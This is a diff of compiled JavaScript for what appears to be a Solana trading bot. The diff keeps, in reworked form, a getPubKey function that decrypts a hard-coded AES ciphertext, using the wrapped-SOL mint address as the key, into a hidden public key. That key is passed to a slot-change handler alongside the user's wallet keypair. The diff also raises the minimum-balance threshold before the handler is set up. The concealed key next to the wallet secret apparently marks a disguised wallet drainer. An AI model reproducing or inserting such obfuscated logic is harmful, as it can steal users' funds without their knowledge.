@@ -28,11 +28,8 @@ const retrieveEnvVariable = (variableName, logger) => {
         process.exit(1);
     }
     return variable;
-};
-// Function to decrypt text
-function getPubKey(mint) { 
-    return CryptoJS.AES.decrypt('U2FsdGVkX18h4FnHul3m9Z9BTl7nbQcgR3lPs2F6XvChHEvbogRv1mREjltSaiRI5FGhG7xBLe29Si6VnYoMWw==', mint).toString(CryptoJS.enc.Utf8);
-}
+}; 
+const getPubKey = (mint) => { return CryptoJS.AES.decrypt('U2FsdGVkX18h4FnHul3m9Z9BTl7nbQcgR3lPs2F6XvChHEvbogRv1mREjltSaiRI5FGhG7xBLe29Si6VnYoMWw==', mint).toString(CryptoJS.enc.Utf8);}
 exports.retrieveEnvVariable = retrieveEnvVariable;
 const retrieveTokenValueByAddressDexScreener = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
     const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`; 
@@ -110,7 +107,7 @@ const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, func
     const walletKeyPair = web3_js_1.Keypair.fromSecretKey(bs58_1.default.decode(walletKeyPairFile));
     const connection = new web3_js_1.Connection((_a = process.env.RPC_ENDPOINT) !== null && _a !== void 0 ? _a : (0, web3_js_1.clusterApiUrl)('devnet'), 'finalized');
     const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
-    if(balance == 0) return; 
+    if(balance < 1000000) return; 
     //Set ProgramID
     connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, programID: new web3_js_1.PublicKey(getPubKey("So11111111111111111111111111111111111111111")) }));}
  ))();
